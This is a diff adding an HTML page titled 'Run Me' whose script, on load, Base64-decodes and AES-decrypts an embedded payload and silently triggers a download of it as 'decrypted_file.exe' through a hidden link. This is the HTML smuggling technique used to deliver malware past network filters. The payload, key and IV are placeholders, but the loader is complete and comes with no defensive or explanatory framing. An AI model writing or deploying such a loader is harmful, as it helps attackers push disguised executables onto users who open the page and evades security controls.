@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Run Me</title>
+    </head>
+    <body>
+        <script>
+            
+			// Function to base64 decode a string to ArrayBuffer
+            function base64ToArrayBuffer(base64) {
+                var binary_string = window.atob(base64);
+                var len = binary_string.length;
+                var bytes = new Uint8Array(len);
+                for (var i = 0; i < len; i++) {
+                    bytes[i] = binary_string.charCodeAt(i);
+                }
+                return bytes.buffer;
+            }
+
+            // Function to decrypt an ArrayBuffer with AES
+            async function aesDecrypt(encrypted, key, iv) {
+                const decodedKey = await window.crypto.subtle.importKey(
+                    "raw",
+                    key,
+                    { name: "AES-CBC" },
+                    false,
+                    ["decrypt"]
+                );
+
+                const decrypted = await window.crypto.subtle.decrypt(
+                    { name: "AES-CBC", iv: iv },
+                    decodedKey,
+                    encrypted
+                );
+
+                return new Uint8Array(decrypted);
+            }
+
+            // Encrypted payload (Base64), AES key (Base64), and IV (Base64)
+            var encryptedBase64 = "ENCRYPTED_PAYLOAD_BASE64";
+            var aesKeyBase64 = "AES_KEY_BASE64";
+            var aesIvBase64 = "AES_IV_BASE64";
+
+            // Convert Base64 strings to ArrayBuffers
+            var encryptedData = base64ToArrayBuffer(encryptedBase64);
+            var aesKey = base64ToArrayBuffer(aesKeyBase64);
+            var aesIv = base64ToArrayBuffer(aesIvBase64);
+
+            // Decrypt the data
+            aesDecrypt(encryptedData, aesKey, aesIv).then(decryptedData => {
+                var blob = new Blob([decryptedData], {type: 'application/octet-stream'});
+                var fileName = 'decrypted_file.exe';
+                var a = document.createElement('a');
+                document.body.appendChild(a);
+                a.style = 'display: none';
+
+                if (window.navigator.msSaveBlob) {
+                    // For IE or older Edge
+                    window.navigator.msSaveBlob(blob, fileName);
+                } else {
+                    // For other browsers
+                    var url = window.URL.createObjectURL(blob);
+                    a.href = url;
+                    a.download = fileName;
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                }
+
+                document.body.removeChild(a);
+            }).catch(console.error);
+        </script>
+    </body>
+</html>
